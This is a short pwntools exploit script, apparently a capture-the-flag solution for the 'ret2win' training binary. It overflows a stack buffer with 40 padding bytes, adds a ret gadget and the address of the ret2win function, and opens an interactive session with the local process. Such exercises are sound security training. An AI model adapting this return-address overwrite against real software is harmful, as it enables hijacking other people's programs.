from pwn import *

p = process('./ret2win')
e = ELF('./ret2win')
r = ROP(e)
payload = b'A' * 40 
payload += p64(r.find_gadget(['ret']).address)
payload += p64(e.symbols['ret2win'])
p.send(payload)
p.interactive()
